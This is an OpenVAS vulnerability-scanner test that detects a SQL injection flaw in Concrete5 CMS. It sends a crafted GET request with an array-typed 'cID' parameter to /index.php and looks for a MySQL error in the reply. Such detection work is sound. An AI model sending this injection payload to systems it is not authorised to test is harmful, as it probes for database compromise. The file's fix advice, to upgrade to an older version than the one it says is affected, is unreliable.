###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_concrete_cms_sql_inj_vuln.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# Concrete5 CMS SQL Injection Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:concrete5:concrete5';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.903511");
  script_version("$Revision: 11867 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-02-19 16:18:17 +0530 (Wed, 19 Feb 2014)");
  script_name("Concrete5 CMS SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 SecPod");
  script_dependencies("gb_concrete5_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("concrete5/installed");

  script_xref(name:"URL", value:"http://1337day.com/exploit/21919");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/31735/");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/125280/concrete5-sql.txt");

  script_tag(name:"summary", value:"The host is installed with Concrete5 CMS and is prone to sql injection
  vulnerability");

  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check whether it
  is possible to execute sql query.");

  script_tag(name:"insight", value:"The flaw is due to improper validation of 'cID' parameter passed to
  '/index.php' script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary SQL
  commands in applications database and gain complete control over the vulnerable
  web application.");

  script_tag(name:"affected", value:"Concrete5 CMS version 5.6.3.4");

  script_tag(name:"solution", value:"Upgrade to version 5.6.3 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"https://www.concrete5.org");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + "/index.php/?arHandle=Main&bID=34&btask=passthru&ccm_token=" +
            "1392630914:be0d09755f653afb162d041a33f5feae&cID[$owmz]=1&" +
            "method=submit_form" ;

if( http_vuln_check( port:port, url:url, pattern:'>mysqlt error:', extra_check:make_list( 'Pages.cID = Array', 'EXECUTE."select Pages.cID' ) ) ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );